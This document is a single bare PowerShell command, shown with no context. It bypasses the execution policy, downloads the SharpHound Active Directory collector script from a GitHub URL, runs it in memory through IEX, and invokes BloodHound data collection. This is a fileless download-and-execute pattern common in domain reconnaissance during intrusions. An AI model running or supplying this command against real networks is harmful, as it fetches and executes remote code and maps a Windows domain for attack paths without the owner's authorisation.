```
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1');Invoke-BloodHound"
```